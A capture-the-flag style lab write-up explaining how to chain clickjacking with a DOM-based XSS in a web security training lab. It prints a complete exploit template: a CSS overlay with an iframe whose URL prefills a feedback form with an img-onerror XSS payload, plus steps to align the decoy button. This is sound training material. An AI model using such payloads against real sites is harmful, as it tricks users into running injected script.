# Clickjacking - Exploiting clickjacking vulnerability to trigger DOM-based XSS

## 📌 Lab Details
- **Title**: Exploiting clickjacking vulnerability to trigger DOM-based XSS
- **Difficulty**: Practitioner
- **Category**: Clickjacking
- **Lab URL**:

## 🔍 Summary
This lab demonstrates combining **Clickjacking with stored XSS** by framing the feedback form with a prepopulated XSS payload, tricking the victim into clicking “Click me” while actually triggering `print()` via the XSS when the victim clicks.

## 🛠 Steps to Solve
1. Log in to the given account.
2. Inject the **XSS** modified payload on the **Exploit** server:
   ```sh
   <style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
	div {
		position:absolute;
		top:$top_value;
		left:$side_value;
		z-index: 1;
	}
   </style>
   <div>Click me</div>
   <iframe
   src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-          website.com&subject=test&message=test#feedbackResult"></iframe>
   ```
3. Adjust the values of the template to align the `Click me` button with the `Submit feedback` button.
4. Deliver exploit to the victim to complete the lab.
   
## 📖 Key Takeaways
- Uses a **prepopulated URL with an XSS payload** (`<img src=1 onerror=print()>`) to execute JavaScript on click.
- Highlights the need for **anti-clickjacking and XSS defenses together** to prevent such chained attacks.
- Shows how **Clickjacking can be used to exploit XSS that requires user interaction**.

## 🖼️ Screenshot 
![image](https://github.com/user-attachments/assets/e3371a7f-cd70-4dd3-a81c-633522d69887)
![image](https://github.com/user-attachments/assets/b1430c2b-09ab-4dc1-b203-415d89f6f7c6)
![image](https://github.com/user-attachments/assets/29b0b755-fdaa-4577-b18b-adba75e7c4a7)
